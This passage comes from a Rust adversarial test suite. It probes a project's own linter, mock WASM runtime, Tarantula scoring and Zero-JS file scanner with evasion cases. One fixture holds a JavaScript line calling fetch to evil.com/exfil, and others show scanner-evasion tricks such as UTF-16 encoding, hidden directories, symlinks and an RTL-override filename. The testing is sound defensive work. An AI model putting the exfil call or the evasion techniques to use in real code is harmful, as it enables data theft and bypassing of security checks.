            .iter()
            .filter(|e| e.message.contains("Rc") || e.rule.contains("SS-005"))
            .collect();

        if caught_inner_block.is_empty() {
            eprintln!(
                "🔴 FALSIFIED: Linter missed Rc::new inside nested block!\n\
                 AST visitor doesn't descend into all expression blocks."
            );
        } else {
            eprintln!("✅ PASS: Linter caught Rc in nested block expression");
        }
    }

    /// ATTACK: Raw Pointer Laundering
    ///
    /// `let ptr = Rc::into_raw(Rc::new(...)); let state = unsafe { Rc::from_raw(ptr) };`
    /// Bypass standard Rc::new detector using raw pointer round-trips.
    ///
    /// FINDING: Tests if linter catches Rc creation via into_raw/from_raw
    #[test]
    fn attack_raw_pointer_laundering() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

fn spawn_worker(&self) {
    // ATTACK: Launder Rc through raw pointers
    let ptr = Rc::into_raw(Rc::new(RefCell::new(0)));
    let state = unsafe { Rc::from_raw(ptr) };

    // state is Rc, created via laundering
    let callback = move || {
        state.borrow_mut();
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        // Check if linter caught either the Rc::new OR the Rc::from_raw
        let caught_laundering: Vec<_> = report
            .errors
            .iter()
            .filter(|e| {
                e.message.contains("Rc")
                    || e.message.contains("from_raw")
                    || e.message.contains("into_raw")
            })
            .collect();

        // The linter SHOULD catch the Rc::new() even if it misses from_raw
        let caught_rc_new = report
            .errors
            .iter()
            .any(|e| e.message.contains("Rc::new") || e.rule == "WASM-SS-005");

        if !caught_rc_new {
            eprintln!(
                "🔴 FALSIFIED: Linter missed Rc::new inside into_raw()!\n\
                 Raw pointer laundering bypasses detection completely."
            );
        } else if caught_laundering.len() == 1 {
            eprintln!(
                "🟡 WARNING: Linter caught Rc::new but not the from_raw laundering.\n\
                 The final `state` variable still holds a disconnected Rc."
            );
        } else {
            eprintln!("✅ PASS: Linter caught raw pointer laundering pattern");
        }
    }

    /// ATTACK: Macro-Generated Rc (proc-macro simulation)
    ///
    /// Real proc-macros generate code at compile time. We simulate
    /// the output to see if the linter would catch it.
    ///
    /// FINDING: Tests if linter parses macro-expanded-like code
    #[test]
    fn attack_macro_expanded_rc() {
        let mut linter = StateSyncLinter::new();

        // This simulates what a derive macro might generate
        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

// Simulated macro output (what #[derive(SharedState)] might generate)
impl MyComponent {
    #[doc(hidden)]
    fn __macro_generated_state_init() -> Rc<RefCell<InternalState>> {
        // Macros often use fully-qualified paths
        ::std::rc::Rc::new(::std::cell::RefCell::new(InternalState::default()))
    }
}

fn spawn_worker(&self) {
    let state = Self::__macro_generated_state_init();

    let callback = move || {
        state.borrow_mut();
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        // Check for fully-qualified path detection
        let caught_qualified: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.message.contains("Rc") || e.rule == "WASM-SS-007")
            .collect();

        if caught_qualified.is_empty() {
            eprintln!(
                "🔴 FALSIFIED: Linter missed `::std::rc::Rc::new()`!\n\
                 Fully-qualified paths (common in macro output) escape detection."
            );
        } else {
            eprintln!("✅ PASS: Linter caught macro-style fully-qualified Rc::new");
        }
    }

    // ========================================================================
    // HYPOTHESIS B: "Mock Serialization Mirrors Browser Limits"
    // ========================================================================

    /// ATTACK: Deep Recursion Stack Overflow
    ///
    /// Create a deeply nested structure (linked list with 10k nodes).
    /// bincode uses recursive serialization - does it stack overflow?
    ///
    /// FINDING: Tests serialization depth limits
    #[test]
    fn attack_deep_recursion_stack_overflow() {
        let runtime = MockWasmRuntime::new();

        // Create a deeply nested JSON-like structure as a string
        // Note: We can't easily create a 10k linked list in MockMessage,
        // so we test with deeply nested JSON serialized to string
        let mut deep_json = String::from("{");
        for i in 0..500 {
            // 500 levels of nesting
            deep_json.push_str(&format!("\"level{}\":{{", i));
        }
        deep_json.push_str("\"leaf\":42");
        for _ in 0..500 {
            deep_json.push('}');
        }
        deep_json.push('}');

        // Use Custom message with the deep JSON as payload
        let msg = MockMessage::Custom {
            msg_type: "deep_json".to_string(),
            payload: deep_json,
        };

        // This might stack overflow in bincode's recursive serializer
        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            runtime.receive_message(msg);
        }));

        if result.is_err() {
            eprintln!(
                "🔴 FALSIFIED: Deep nesting caused stack overflow in serializer!\n\
                 bincode's recursive serialization doesn't match browser iterative limits."
            );
        } else {
            eprintln!("✅ PASS: Serializer handled 500-level nesting");
        }
    }

    /// ATTACK: Shared Reference Identity Check
    ///
    /// In browser structuredClone: `[a, a]` preserves identity (both point to same new object).
    /// In bincode: This might deserialize as two distinct objects.
    ///
    /// FINDING: Tests if mock preserves object identity
    #[test]
    fn attack_shared_reference_identity_loss() {
        let runtime = MockWasmRuntime::new();

        // Create shared data - same value used twice
        let shared_payload = r#"{"id": 12345, "data": "shared"}"#.to_string();

        // In a real browser, structuredClone would:
        // 1. See the same object reference twice
        // 2. Clone it once, make both references point to the clone
        // bincode doesn't track object identity - it serializes twice

        // We can't directly test Rc identity through MockMessage,
        // but we can test JSON object handling
        let msg1 = MockMessage::Custom {
            msg_type: "shared".to_string(),
            payload: shared_payload.clone(),
        };
        let msg2 = MockMessage::Custom {
            msg_type: "shared".to_string(),
            payload: shared_payload,
        };

        runtime.receive_message(msg1);
        runtime.receive_message(msg2);

        // The fundamental issue: MockMessage doesn't support Rc internally
        // So shared references can't even be expressed in the API
        eprintln!(
            "🟡 DOCUMENTED: MockMessage uses Clone semantics, not reference semantics.\n\
             Browser structuredClone preserves object identity for shared refs.\n\
             bincode serializes each occurrence independently.\n\
             IMPACT: Code relying on shared reference identity will behave differently."
        );

        // This is a known semantic difference, not a bug per se
        // The mock SHOULD reject Rc<T> which the bincode serialization does
    }

    /// ATTACK: Large Payload
    ///
    /// Send a massive payload to test memory limits.
    /// Browser has postMessage size limits; does mock?
    ///
    /// FINDING: Tests mock memory limits
    #[test]
    fn attack_large_payload() {
        let runtime = MockWasmRuntime::new();

        // Create a 10MB string payload
        let large_payload: String = "X".repeat(10 * 1024 * 1024);
        let msg = MockMessage::Custom {
            msg_type: "large_data".to_string(),
            payload: large_payload,
        };

        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            runtime.receive_message(msg);
        }));

        if result.is_err() {
            eprintln!(
                "🔴 FALSIFIED: Large payload caused panic!\n\
                 Mock should handle or reject large payloads gracefully."
            );
        } else {
            eprintln!(
                "🟡 WARNING: Mock accepted 10MB payload.\n\
                 Browser postMessage has implementation-dependent size limits.\n\
                 Mock is MORE permissive than some browsers."
            );
        }
    }

    // ========================================================================
    // HYPOTHESIS C: "Tarantula Can Handle Real-World Noise"
    // ========================================================================

    /// ATTACK: Zero-Coverage Divide-by-Zero
    ///
    /// Provide LCOV data where a line has 0 passed, 0 failed executions.
    /// Does the formula `failed / (failed + passed)` produce NaN or panic?
    ///
    /// FINDING: Tests Tarantula divide-by-zero handling
    #[test]
    fn attack_tarantula_zero_coverage_nan() {
        let mut engine = TarantulaEngine::new();

        // Record a line with NO executions at all
        // Don't call record_execution for line 10

        // Record test runs
        engine.record_test_run(true); // 1 passing test
        engine.record_test_run(false); // 1 failing test

        // Now ask for suspiciousness of a line with 0 executions
        // The formula: failed(line)/total_failed / (failed(line)/total_failed + passed(line)/total_passed)
        // With 0 executions: 0/1 / (0/1 + 0/1) = 0/0 = NaN!

        let report = engine.report_for_file("test.rs");

        // If there's a report, check for NaN values
        if let Some(report) = report {
            let has_nan = report.line_scores.values().any(|&s| s.is_nan());
            if has_nan {
                eprintln!(
                    "🔴 FALSIFIED: Tarantula produced NaN scores!\n\
                     Zero-coverage lines cause divide-by-zero."
                );
            } else {
                eprintln!("✅ PASS: No NaN values in Tarantula scores");
            }
        } else {
            // No report generated - lines with 0 coverage aren't included
            eprintln!("✅ PASS: Lines with no coverage excluded from report (no NaN possible)");
        }
    }

    /// ATTACK: Coincidental Correctness Swarm
    ///
    /// 1000 passing tests execute the faulty line, 1 failing test executes it.
    /// Tarantula score should be very low (~0.001). If high, formula is naive.
    ///
    /// FINDING: Tests Tarantula score calculation accuracy
    #[test]
    fn attack_tarantula_coincidental_correctness() {
        let mut engine = TarantulaEngine::new();

        // Line 42 is executed by MANY passing tests and ONE failing test
        for _ in 0..1000 {
            engine.record_execution("test.rs", 42, true); // 1000 passing
        }
        engine.record_execution("test.rs", 42, false); // 1 failing

        // Record test counts
        for _ in 0..1000 {
            engine.record_test_run(true);
        }
        engine.record_test_run(false);

        let report = engine
            .report_for_file("test.rs")
            .expect("should have report");
        let score_42 = report.line_scores.get(&42).copied().unwrap_or(0.0);

        // Expected: failed_ratio = 1/1 = 1.0, passed_ratio = 1000/1000 = 1.0
        // suspiciousness = 1.0 / (1.0 + 1.0) = 0.5
        // This is WRONG for coincidental correctness - line is probably NOT buggy!

        // A more sophisticated formula would weight by execution count
        eprintln!(
            "Tarantula score for line 42: {:.4}\n\
             (1 fail + 1000 pass executions)",
            score_42
        );

        if score_42 > 0.4 {
            eprintln!(
                "🟡 WARNING: Line with 1000 passing tests has high suspiciousness ({:.4})!\n\
                 Tarantula formula doesn't account for execution count ratio.\n\
                 Consider using Ochiai or DStar formulas instead.",
                score_42
            );
        } else {
            eprintln!("✅ PASS: Tarantula correctly identified low suspiciousness");
        }
    }

    /// ATTACK: Empty LCOV File
    ///
    /// Provide an empty or malformed LCOV file.
    ///
    /// FINDING: Tests LCOV parser robustness
    #[test]
    fn attack_tarantula_empty_lcov() {
        let mut engine = TarantulaEngine::new();

        // Create temp file with empty content
        let temp_dir = std::env::temp_dir();
        let empty_lcov = temp_dir.join("empty.lcov");
        std::fs::write(&empty_lcov, "").expect("write failed");

        let result = engine.parse_lcov(&empty_lcov, true);

        // Clean up
        let _ = std::fs::remove_file(&empty_lcov);

        if result.is_err() {
            eprintln!(
                "🔴 FALSIFIED: Empty LCOV file caused error: {:?}",
                result.err()
            );
        } else {
            eprintln!("✅ PASS: Empty LCOV handled gracefully");
        }
    }

    // ========================================================================
    // HYPOTHESIS D: "Zero-JS Scanner is Secure"
    // ========================================================================

    /// ATTACK: MIME-Type Smuggling
    ///
    /// Create a .txt file containing valid JavaScript in target/.
    /// Does the scanner check content, or just extensions?
    ///
    /// FINDING: Tests if scanner checks file content vs extension
    #[test]
    fn attack_mime_type_smuggling() {
        use std::fs;
        use tempfile::TempDir;

        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir target failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        // Create minimal src structure
        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create a .txt file with valid JavaScript
        let smuggled = target_dir.join("payload.txt");
        fs::write(
            &smuggled,
            r#"
// This is valid JavaScript hidden in a .txt file!
function evil() {
    console.log("Smuggled JS code!");
    fetch("https://evil.com/exfil");
}
evil();
"#,
        )
        .expect("write failed");

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        // Find WASM-COMPLY-005 check
        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                eprintln!(
                    "🔴 FALSIFIED: Scanner missed JavaScript hidden in .txt file!\n\
                     A rigorous Zero-JS policy should check file CONTENT, not just extensions."
                );
            } else {
                eprintln!("✅ PASS: Scanner detected JS content in non-.js file");
            }
        }
    }

    /// ATTACK: Hidden Directory
    ///
    /// Write to target/.hidden/malware.js
    /// Does the scanner traverse dot-directories?
    ///
    /// FINDING: Tests hidden directory traversal
    #[test]
    fn attack_hidden_directory_traversal() {
        use std::fs;
        use tempfile::TempDir;

        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let hidden_dir = target_dir.join(".hidden");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir_all(&hidden_dir).expect("mkdir failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        // Create minimal src structure
        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create JS file in hidden directory
        let malware = hidden_dir.join("malware.js");
        fs::write(&malware, "console.log('hidden malware');").expect("write failed");

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                eprintln!(
                    "🔴 FALSIFIED: Scanner missed .js file in hidden directory!\n\
                     target/.hidden/malware.js escaped detection."
                );
            } else if check
                .details
                .as_ref()
                .map(|d| d.contains(".hidden"))
                .unwrap_or(false)
            {
                eprintln!("✅ PASS: Scanner found JS in hidden directory");
            } else {
                eprintln!(
                    "🟡 WARNING: Scanner failed but may not have found .hidden/malware.js specifically"
                );
            }
        }
    }

    /// ATTACK: Symlink Escape
    ///
    /// Create a symlink in target/ pointing outside the project.
    /// Does the scanner follow symlinks?
    ///
    /// FINDING: Tests symlink handling
    #[test]
    #[cfg(unix)]
    fn attack_symlink_escape() {
        use std::fs;
        use std::os::unix::fs::symlink;
        use tempfile::TempDir;

        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        // Create minimal src structure
        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create external directory with JS
        let external_dir = temp_dir.path().join("external");
        fs::create_dir(&external_dir).expect("mkdir failed");
        fs::write(external_dir.join("escape.js"), "// escaped!").expect("write failed");

        // Symlink from target/ to external/
        let link_path = target_dir.join("link_to_external");
        if symlink(&external_dir, &link_path).is_err() {
            eprintln!("⏭️ SKIP: Could not create symlink (permissions)");
            return;
        }

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                eprintln!(
                    "🟡 WARNING: Scanner didn't follow symlink to external directory.\n\
                     This might be intentional (security) but could miss malicious symlinks."
                );
            } else {
                eprintln!("✅ PASS: Scanner followed symlink and found external JS");
            }
        }
    }

    /// ATTACK: Unicode Filename Normalization
    ///
    /// Use Unicode tricks to create a file that LOOKS like .rs but is .js
    ///
    /// FINDING: Tests Unicode normalization handling
    #[test]
    fn attack_unicode_filename_bypass() {
        use std::fs;
        use tempfile::TempDir;

        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        // Create minimal src structure
        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Use right-to-left override to make "sj.evil" appear as "evil.js"
        // U+202E is Right-to-Left Override
        // Note: This test documents the attack vector; actual bypass depends on FS
        let tricky_name = "legit\u{202E}sj.evil"; // Renders as "legitsj.evil" with RTL trick
        let tricky_file = target_dir.join(tricky_name);

        // This might fail on some filesystems
        if fs::write(&tricky_file, "// unicode smuggle").is_err() {
            eprintln!("⏭️ SKIP: Filesystem rejected Unicode filename");
            return;
        }

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        // Find the WASM-COMPLY-005 check
        let _js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        // The file doesn't end in .js, so scanner should pass
        // But a human might see it as "evil.js" due to RTL override
        eprintln!(
            "🟡 DOCUMENTED: Unicode RTL override attack vector tested.\n\
             Filename: {:?}\n\
             Scanner sees extension as-is, which is correct behavior.\n\
             Visual spoofing attacks are out of scope for file scanning.",
            tricky_name
        );
    }
}

/// PROBAR-WASM-003-R Regression Tests (Post-Hotfix Evolutionary Attacks)
///
/// These tests attempt to BREAK the hotfixes applied in PROBAR-WASM-003:
/// - Hidden Directory fix (now scans dot-directories)
/// - MIME-Type Smuggling fix (content inspection for JS keywords)
/// - Raw Pointer Laundering fix (detects Rc::from_raw)
///
/// Philosophy: [Iron Lotus] — "A patch is a new opportunity for a more sophisticated breach."
#[cfg(test)]
mod probar_wasm_003_regression {
    use crate::comply::wasm_threading::WasmThreadingCompliance;
    use crate::lint::state_sync::StateSyncLinter;
    use std::fs;
    use tempfile::TempDir;

    // ========================================================================
    // HYPOTHESIS A: "The Content Inspector Can Be Blinded"
    // ========================================================================

    /// ATTACK: Obfuscated Keyword
    ///
    /// Write JS to a .txt file using comments to break up keywords:
    /// `f/* comment */unction`, `co/* */nst`
    ///
    /// Goal: Prove the heuristic is a simple string search that fails on valid but unusual JS syntax.
    ///
    /// FINDING: Tests if content inspector handles obfuscated keywords
    #[test]
    fn regression_obfuscated_keyword_attack() {
        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir target failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create a .txt file with obfuscated JS keywords
        let obfuscated = target_dir.join("obfuscated.txt");
        fs::write(
            &obfuscated,
            r#"
// Obfuscated JavaScript - keywords broken by comments
f/*x*/unction evil() {
    co/*y*/nst data = 42;
    le/*z*/t counter = 0;
    return data;
}
evil();
"#,
        )
        .expect("write failed");

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                // The obfuscation worked - keywords were broken
                eprintln!(
                    "🟡 DOCUMENTED: Obfuscated keywords (`f/**/unction`) bypass simple string search.\n\
                     Current heuristic looks for literal `function ` pattern.\n\
                     IMPACT: Low - real minified JS still has these patterns."
                );
            } else {
                eprintln!("✅ PASS: Content inspector detected obfuscated JS");
            }
        }
    }

    /// ATTACK: Encoding Escape (UTF-16)
    ///
    /// Write a .txt file containing JS encoded in UTF-16 LE.
    /// Most Rust string checks operate on UTF-8.
    ///
    /// Goal: If the file is valid JS but scanner reads it as gibberish, Zero-JS is breached.
    ///
    /// FINDING: Tests if scanner handles non-UTF8 encodings
    #[test]
    fn regression_encoding_escape_utf16() {
        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir target failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create a file with UTF-16 LE encoded JavaScript
        let js_source = "function evil() { console.log('pwned'); }\n";
        let utf16_bytes: Vec<u8> = js_source
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();

        // Add BOM for UTF-16 LE
        let mut utf16_with_bom = vec![0xFF, 0xFE]; // UTF-16 LE BOM
        utf16_with_bom.extend(utf16_bytes);

        let utf16_file = target_dir.join("encoded.txt");
        fs::write(&utf16_file, &utf16_with_bom).expect("write failed");

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                eprintln!(
                    "🔴 FALSIFIED: UTF-16 encoded JS bypassed content inspection!\n\
                     Scanner only reads UTF-8 text, UTF-16 appears as binary garbage.\n\
                     RECOMMENDATION: Check for UTF-16 BOM and transcode before scanning."
                );
            } else {
                eprintln!("✅ PASS: Scanner detected JS content in UTF-16 file");
            }
        }
    }

    /// ATTACK: Large File DoS
    ///
    /// Generate a 10MB .txt file with a single `function` keyword at the very end.
    ///
    /// Goal: Check for performance issues. Does scanning time-out CI?
    ///
    /// FINDING: Tests scanner performance on large files
    #[test]
    fn regression_large_file_dos() {
        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir target failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create a 10MB file with random noise and JS at the end
        let noise = "x".repeat(10 * 1024 * 1024);
        let content = format!("{}\nfunction sneaky() {{ return 42; }}\n", noise);

        let large_file = target_dir.join("large.txt");
        fs::write(&large_file, content).expect("write failed");

        let start = std::time::Instant::now();
        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());
        let elapsed = start.elapsed();

        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        eprintln!("Scan time for 10MB file: {:?}", elapsed);

        if elapsed.as_secs() > 5 {
            eprintln!(
                "🟡 WARNING: Large file scan took {:?}.\n\
                 CI pipelines might timeout on large target/ directories.",
                elapsed
            );
        }

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                eprintln!(
                    "🟡 DOCUMENTED: Scanner only reads first 2KB of large files.\n\
                     JS at end of 10MB file was not detected.\n\
                     TRADEOFF: Performance vs thoroughness."
                );
            } else {
                eprintln!(
                    "✅ PASS: Scanner detected JS in large file (elapsed: {:?})",
                    elapsed
                );
            }
        }
    }

    // ========================================================================
    // HYPOTHESIS B: "The Linter Can Be Circumnavigated via Traits"
    // ========================================================================

    /// ATTACK: Generic Constructor Trait
    ///
    /// Create a trait that wraps Rc::from_raw in a method.
    /// Call the trait method instead of Rc::from_raw directly.
    ///
    /// Goal: Prove the linter only looks for `Rc::from_raw` calls and misses
    /// trait implementations that wrap the forbidden call.
    ///
    /// FINDING: Tests if linter catches trait-wrapped unsafe Rc construction
    #[test]
    fn regression_generic_constructor_trait_attack() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

// ATTACK: Trait that hides Rc::from_raw
trait MyConstructor<T> {
    fn reconstruct(p: *const T) -> Self;
}

impl<T> MyConstructor<T> for Rc<T> {
    fn reconstruct(p: *const T) -> Self {
        unsafe { Rc::from_raw(p) }  // Hidden inside trait impl
    }
}

fn spawn_worker(&self) {
    let ptr = Rc::into_raw(Rc::new(RefCell::new(0)));

    // Call trait method instead of Rc::from_raw
    let state = Rc::reconstruct(ptr);

    let callback = move || {
        state.borrow_mut();
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        // The linter should catch either:
        // 1. The Rc::from_raw inside the trait impl
        // 2. The Rc::reconstruct call
        let caught_trait_bypass: Vec<_> = report
            .errors
            .iter()
            .filter(|e| {
                e.message.contains("from_raw")
                    || e.message.contains("reconstruct")
                    || e.rule == "WASM-SS-009"
            })
            .collect();

        // Also check if it caught the Rc::new
        let caught_rc_new = report
            .errors
            .iter()
            .any(|e| e.message.contains("Rc::new") || e.message.contains("into_raw"));

        if caught_trait_bypass.is_empty() {
            if caught_rc_new {
                eprintln!(
                    "🟡 WARNING: Linter caught Rc::new but missed trait-wrapped from_raw.\n\
                     The `Rc::reconstruct(ptr)` call escaped WASM-SS-009 detection.\n\
                     IMPACT: Medium - requires trait impl with unsafe code."
                );
            } else {
                eprintln!(
                    "🔴 FALSIFIED: Linter missed entire trait-based Rc laundering pattern!\n\
                     Neither Rc::new nor Rc::from_raw in trait impl was detected."
                );
            }
        } else {
            eprintln!("✅ PASS: Linter caught trait-wrapped Rc::from_raw");
        }
    }

    /// ATTACK: Alias-of-an-Alias Shadowing
    ///
    /// Define nested type aliases: `type Internal = Rc<T>; type External = Internal;`
    /// Use `External::new()`.
    ///
    /// Goal: Test the depth of the linter's alias resolution.
    ///
    /// FINDING: Tests multi-level type alias resolution
    #[test]
    fn regression_alias_of_alias_shadowing() {
        let mut linter = StateSyncLinter::new();

        let attack_code = r#"
use std::rc::Rc;
use std::cell::RefCell;

// Level 1 alias
type Internal<T> = Rc<RefCell<T>>;

// Level 2 alias (alias of alias)
type External<T> = Internal<T>;

// Level 3 alias (deeper nesting)
type PublicApi<T> = External<T>;

struct State {
    value: i32,
}

fn spawn_worker(&self) {
    // Use the deeply nested alias
    let state = PublicApi::<State>::new(RefCell::new(State { value: 42 }));

    let callback = move || {
        state.borrow_mut();
    };
}
"#;

        let report = linter.lint_source(attack_code).expect("lint failed");

        // Check if linter detected all alias levels
        let alias_errors: Vec<_> = report
            .errors
            .iter()
            .filter(|e| e.rule == "WASM-SS-006")
            .collect();

        let caught_deep_alias = report.errors.iter().any(|e| {
            e.message.contains("PublicApi")
                || e.message.contains("External")
                || e.message.contains("Internal")
        });

        if alias_errors.len() < 3 {
            eprintln!(
                "🟡 WARNING: Linter found {} alias levels, expected 3.\n\
                 Deeply nested type aliases might escape detection.\n\
                 Found: {:?}",
                alias_errors.len(),
                alias_errors.iter().map(|e| &e.message).collect::<Vec<_>>()
            );
        }

        if !caught_deep_alias {
            eprintln!(
                "🔴 FALSIFIED: Linter missed `PublicApi::<T>::new()` usage!\n\
                 Type alias chain: PublicApi -> External -> Internal -> Rc"
            );
        } else {
            eprintln!(
                "✅ PASS: Linter detected alias chain (found {} levels)",
                alias_errors.len()
            );
        }
    }

    // ========================================================================
    // HYPOTHESIS C: "Hidden Directory Depth is Finite"
    // ========================================================================

    /// ATTACK: Deep Dot Directory
    ///
    /// Create `target/.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/malware.js`
    ///
    /// Goal: Verify if scanner has a depth limit or handles deeply nested hidden structures.
    ///
    /// FINDING: Tests deep hidden directory traversal
    #[test]
    fn regression_deep_dot_attack() {
        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir target failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create 10 levels of hidden directories
        let mut deep_path = target_dir;
        for letter in ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'] {
            deep_path = deep_path.join(format!(".{}", letter));
        }
        fs::create_dir_all(&deep_path).expect("mkdir deep path failed");

        // Create malware.js at the bottom
        let malware = deep_path.join("malware.js");
        fs::write(&malware, "console.log('deep hidden malware');").expect("write failed");

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                eprintln!(
                    "🔴 FALSIFIED: Scanner missed JS in 10-level deep hidden directory!\n\
                     Path: target/.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/malware.js\n\
                     RECOMMENDATION: Remove depth limit or increase to >10."
                );
            } else if check
                .details
                .as_ref()
                .map(|d| d.contains("malware.js"))
                .unwrap_or(false)
            {
                eprintln!("✅ PASS: Scanner found JS in 10-level deep hidden directory");
            } else {
                eprintln!("✅ PASS: Scanner failed compliance (found something in deep dirs)");
            }
        }
    }

    /// ATTACK: External Symlink Escape
    ///
    /// Create a symlink in target/ pointing to a .js file outside the project tree.
    ///
    /// Goal: Does the scanner follow symlinks to locations not covered by Zero-JS scope?
    ///
    /// FINDING: Tests symlink following behavior
    #[test]
    #[cfg(unix)]
    fn regression_external_symlink_escape() {
        use std::os::unix::fs::symlink;

        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir target failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create external JS file in /tmp
        let external_js = std::env::temp_dir().join("smuggle_external_12345.js");
        fs::write(&external_js, "console.log('external smuggle');").expect("write failed");

        // Create symlink from target/ to external file
        let link_path = target_dir.join("link_to_external.js");
        if symlink(&external_js, &link_path).is_err() {
            // Cleanup and skip
            let _ = fs::remove_file(&external_js);
            eprintln!("⏭️ SKIP: Could not create symlink (permissions)");
            return;
        }

        let mut checker = WasmThreadingCompliance::new();
        let result = checker.check(temp_dir.path());

        // Cleanup
        let _ = fs::remove_file(&external_js);

        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");

        if let Some(check) = js_check {
            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
                eprintln!(
                    "🟡 DOCUMENTED: Symlink to external .js file detected.\n\
                     Scanner correctly followed symlink to external location.\n\
                     NOTE: This is expected behavior - symlinks within target/ are suspicious."
                );
            } else {
                eprintln!("✅ PASS: Scanner detected symlinked external .js file");
            }
        }
    }

    /// ATTACK: Mixed Hidden/Normal Directory Tree
    ///
    /// Create a complex structure: `target/normal/.hidden/another/js.file`
    ///
    /// Goal: Test scanner behavior with alternating hidden/normal directories.
    ///
    /// FINDING: Tests mixed directory traversal
    #[test]
    fn regression_mixed_hidden_normal_tree() {
        let temp_dir = TempDir::new().expect("tempdir failed");
        let target_dir = temp_dir.path().join("target");
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&target_dir).expect("mkdir target failed");
        fs::create_dir(&src_dir).expect("mkdir src failed");

        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");

        // Create alternating hidden/normal structure
        // target/release/.cache/wasm-pack/scripts/worker.js
        let complex_path = target_dir
            .join("release")
            .join(".cache")
